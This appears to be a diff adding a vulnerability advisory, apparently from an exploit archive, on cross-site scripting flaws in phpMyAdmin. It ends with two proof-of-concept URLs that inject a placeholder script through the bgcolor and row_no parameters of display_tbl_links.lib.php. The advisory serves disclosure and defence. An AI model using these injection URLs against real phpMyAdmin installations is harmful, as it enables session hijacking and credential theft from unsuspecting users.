@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/12644/info
+ 
+Multiple remote cross-site scripting vulnerabilities affect phpMyAdmin. These issues are due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.
+ 
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/phpMyAdmin/libraries/display_tbl_links.lib.php?doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&bgcolor=%22%3E[XSS%20code]
+http://www.example.com/phpMyAdmin/libraries/display_tbl_links.lib.php?doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&row_no=%22%3E[XSS%20code]
